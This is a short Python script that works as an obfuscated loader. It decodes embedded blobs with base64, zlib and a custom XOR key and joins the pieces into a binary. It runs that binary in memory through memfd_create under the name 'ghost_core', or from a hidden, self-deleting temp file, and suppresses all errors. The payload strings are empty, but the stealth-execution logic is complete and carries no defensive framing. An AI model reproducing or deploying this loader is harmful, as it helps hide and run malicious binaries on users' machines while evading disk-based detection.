import os,sys,base64,zlib,subprocess,struct,tempfile,time,ctypes
FK=b'2l"F"o2v?Il)j!Lw4t\'Yer1*Yd)/i`;5Cy~z-5{8yba&5&9tXv:=^wbPzjzFUIqz'
P=""
KP=""
JD=""
def _rx(d, k):
 l=len(k);r=bytearray()
 for i,b in enumerate(d):r.append(b^k[i%l]^k[(i+1)%l])
 return bytes(r)

def _mem_run(bin_data):
 try:
  libc = ctypes.CDLL("libc.so")
  fd = libc.memfd_create(b"ghost_core", 1)
  if fd == -1: return False
  os.write(fd, bin_data)
  path = "/proc/self/fd/" + str(fd)
  subprocess.Popen([path]+sys.argv[1:]).wait()
  try: os.close(fd)
  except: pass
  return True
 except: return False

def _ghost_run():
 try:
  kd=zlib.decompress(_rx(base64.b64decode(KP),FK))
  off=0;sks=[]
  while off<len(kd):
   l=struct.unpack("<I",kd[off:off+4])[0];off+=4
   sks.append(kd[off:off+l]);off+=l
  pd=zlib.decompress(_rx(base64.b64decode(P),FK))
  off=0;shs=[]
  for i in range(len(sks)):
   if off+4>len(pd):break
   l=struct.unpack("<I",pd[off:off+4])[0];off+=4
   enc=pd[off:off+l];off+=l
   shs.append(zlib.decompress(_rx(enc,sks[i])))
  full_bin=b"".join(shs)
  if _mem_run(full_bin): return
  f,p=tempfile.mkstemp(prefix=".proc_",suffix="")
  os.write(f,full_bin);os.close(f);os.chmod(p,0o700)
  e=os.environ.copy();e["PYTHONHOME"]=sys.prefix
  subprocess.Popen([p]+sys.argv[1:],env=e).wait()
  try:os.remove(p)
  except:pass
 except Exception:pass
if __name__=="__main__":_ghost_run()
